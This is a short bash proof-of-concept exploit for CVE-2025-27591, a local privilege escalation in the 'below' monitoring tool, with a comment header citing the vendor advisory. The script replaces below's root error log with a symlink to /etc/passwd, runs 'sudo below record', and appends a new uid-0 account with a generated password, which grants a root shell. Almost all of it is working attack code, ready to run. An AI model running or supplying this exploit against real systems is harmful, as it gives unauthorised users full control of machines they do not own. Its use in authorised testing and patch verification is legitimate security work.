#!/bin/bash

: '
PoC script for CVE-2025-27591
Source: https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w

World-writable /var/log/below directory allows local privilege escalation through symlink attacks.
Affected versions: < 0.9.0
Prereqs: Local user needs to be able to execute `below` with sudo.
This PoC adds a new user to /etc/passwd
'

LOG_FILE="/var/log/below/error_root.log"

if [[ -f $LOG_FILE ]]; then
    rm "$LOG_FILE"
    echo "[*] Remove existing $LOG_FILE"
fi

cd /var/log/below
echo '[*] Create symlink to /etc/passwd'
ln -s /etc/passwd /var/log/below/error_root.log
sudo below record
# Generate a random password
pw=$(openssl rand -base64 12)
hash=$(openssl passwd -6 "$pw")
echo '[*] Adding our user to /etc/passwd'
echo -e "benkyou:$hash:0:0:/root:/bin/bash" >> /var/log/below/error_root.log
echo "su to user benkyou with password: $pw"